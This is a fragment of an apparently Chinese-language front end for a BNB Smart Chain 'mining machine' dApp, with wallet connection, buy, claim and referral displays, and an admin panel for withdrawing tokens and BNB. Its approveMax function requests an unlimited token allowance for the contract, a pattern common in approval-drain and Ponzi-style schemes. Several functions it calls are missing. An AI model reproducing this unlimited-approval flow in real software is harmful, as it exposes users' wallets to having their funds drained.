  <style>
    :root { --bg:#121212; --panel:#1e1e1e; --accent:#3f51b5; --text:#e0e0e0; }
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{background:var(--panel);border-radius:16px;padding:32px;max-width:800px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.5);backdrop-filter:blur(10px);transition:.3s}
    h1{margin-top:0;text-align:center;font-weight:700;font-size:2rem}
    .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 24px;border-radius:8px;border:none;font-size:1rem;cursor:pointer;transition:.3s;background:var(--accent);color:#fff;margin:8px 4px}
    .btn:disabled{background:#555}
    .btn:hover{filter:brightness(1.1)}
    .row{display:flex;gap:16px;flex-wrap:wrap}
    .col{flex:1 1 200px}
    .stat{margin:8px 0}
    .lang{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--accent)}
    .alert{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;display:none}
    .alert.ok{background:#27ae60;color:#fff}
    .alert.err{background:#e74c3c;color:#fff}
  </style>

  <div class="card">
    <span class="lang" onclick="toggleLang()">🌐 中文/English</span>
    <h1 id="title">矿机商店</h1>

    <div id="connectPanel">
      <button class="btn" id="btnConnect" onclick="connectWallet()"><i class="fas fa-wallet"></i> <span id="connectTxt">连接钱包</span></button>
    </div>

    <!-- 用户面板 -->
    <div id="userPanel" style="display:none">
      <div class="row">
        <div class="col">
          <div class="stat"><strong id="statNormal">普通矿机: --</strong></div>
          <div class="stat"><strong id="statTest">测试矿机: --</strong></div>
          <div class="stat"><strong id="statPower">增强矿机: --</strong></div>
          <div class="stat"><strong id="statDaily">日产量: --</strong></div>
        </div>
        <div class="col">
          <div class="stat"><strong id="statUnclaimed">未领取: --</strong></div>
          <div class="stat"><strong id="statRef">推荐奖励: --</strong></div>
          <div class="stat"><strong id="statPowerTotal">总算力: --</strong></div>
        </div>
      </div>
      <div class="row">
        <button class="btn" onclick="approveMax()"><i class="fas fa-key"></i> <span id="btnApprove">授权无限</span></button>
        <button class="btn" onclick="buyInitial()"><i class="fas fa-plus"></i> <span id="btnBuyInit">购买初始矿机</span></button>
        <button class="btn" onclick="buyTest()"><i class="fas fa-plus"></i> <span id="btnBuyTest">测试矿机</span></button>
        <button class="btn" onclick="buyPower()"><i class="fas fa-plus"></i> <span id="btnBuyPower">增强矿机</span></button>
        <button class="btn" onclick="claim()"><i class="fas fa-gift"></i> <span id="btnClaim">领取收益</span></button>
      </div>
    </div>

    <!-- 管理员面板 -->
    <div id="adminPanel" style="display:none">
      <h2 id="adminTitle">管理员面板</h2>
      <input id="adminAddr" placeholder="地址" class="btn" style="width:100%;margin-bottom:12px" />
      <div class="row">
        <button class="btn" onclick="addAdmin()"><i class="fas fa-user-plus"></i> <span id="btnAdd">添加管理员</span></button>
        <button class="btn" onclick="removeAdmin()"><i class="fas fa-user-minus"></i> <span id="btnRemove">移除管理员</span></button>
        <button class="btn" onclick="withdrawToken()"><i class="fas fa-coins"></i> <span id="btnWithdrawT">提回代币</span></button>
        <button class="btn" onclick="withdrawBNB()"><i class="fas fa-coins"></i> <span id="btnWithdrawB">提回 BNB</span></button>
      </div>
    </div>
  </div>

    let signer, userAddress;

    function showAlert(msg, type) {
      const el = document.createElement("div");
      el.className = `alert ${type}`;
      el.textContent = msg;
      el.style.display = "block";
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 3000);
    }

    async function connectWallet() {
      const provider = window.ethereum || window.tp || window.okexchain || window.bitkeep?.ethereum;
      if (!provider) {
        showAlert("请使用支持 BSC 的钱包浏览器", "err");
        return;
      }

      try {
        await provider.request({ method: "eth_requestAccounts" });
        const chainId = await provider.request({ method: "eth_chainId" });
        if (chainId !== "0x38") {
          showAlert("请切换到 BSC 主网", "err");
          return;
        }

        const web3Provider = new ethers.providers.Web3Provider(provider);
        signer = web3Provider.getSigner();
        userAddress = await signer.getAddress();

        document.getElementById("connectTxt").textContent = "已连接";
        document.getElementById("connectPanel").style.display = "none";
        document.getElementById("userPanel").style.display = "block";

        loadUserData();
      } catch (err) {
        showAlert("连接失败：" + err.message, "err");
      }
    }

    async function approveMax() {
      if (!signer) {
        showAlert("请先连接钱包", "err");
        return;
      }

      const TOKEN_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);

      const maxAmount = ethers.constants.MaxUint256;

      try {
        const tx = await tokenContract.approve(CONTRACT_ADDRESS, maxAmount);
        await tx.wait();
        showAlert("授权成功", "ok");
      } catch (err) {
        showAlert("授权失败：" + err.message, "err");
      }
    }
